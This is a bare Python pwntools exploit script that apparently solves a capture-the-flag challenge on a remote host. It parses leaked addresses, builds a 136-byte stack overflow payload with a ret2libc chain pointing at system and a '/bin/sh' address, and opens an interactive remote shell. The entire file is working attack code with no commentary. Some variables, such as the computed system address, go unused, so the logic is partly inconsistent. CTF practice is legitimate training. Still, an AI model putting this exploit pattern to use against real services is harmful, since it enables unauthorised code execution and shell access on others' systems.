from pwn import *

r= remote("ctf.j0n9hyun.xyz", 3018)
gets = 0x005f3e0
fget = 0x080498f8
system = 0x3ada0
_bin_offset = 0x15ba0b

print r.recvuntil(": ")
bing = int(r.recv(10),16)
log.info("binsh:%#x",bing)
#r.recvuntil(" ")
sing = int(r.recv(10),16)
sysaddr = sing - system
log.info("sys:%#x",sysaddr)
r.sendline("1")
binaddr =_bin_offset+sysaddr

print r.recvline()
payload = "a"*136
payload += p32(sing)
payload += "aaaa"
payload += p32(binaddr)
r.sendline(payload)
r.interactive()
